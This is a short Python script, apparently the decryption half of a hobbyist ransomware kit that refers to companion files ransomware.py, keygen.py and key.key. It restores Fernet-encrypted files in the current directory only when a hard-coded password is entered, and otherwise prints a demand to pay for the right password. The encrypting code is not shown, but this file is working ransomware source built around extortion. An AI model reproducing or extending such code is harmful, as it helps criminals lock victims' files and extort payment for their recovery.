import os
from cryptography.fernet import Fernet

allfiles = []
for file in  os.listdir():
    if file == 'ransomware.py' or file == "key.key" or file == "decr.py" or file == "keygen.py":
        continue
    if os.path.isfile(file):
        allfiles.append(file)

print(allfiles)

with open('key.key', "rb") as key:
    secret_key = key.read()

passphrase = "BiNdU!"

print("Key: " + str(secret_key))

userpass = input("Enter the password you received from us: ")

if userpass == passphrase:
    for file in allfiles:
        with open(file, "rb") as thefile:
            content = thefile.read()
        content_decr = Fernet(secret_key).decrypt(content)

        with open(file, "wb") as thefile:
            thefile.write(content_decr)

    print("Your files has been Decrypted!")
else:
    print("Wrong password! Pay to receive the right password")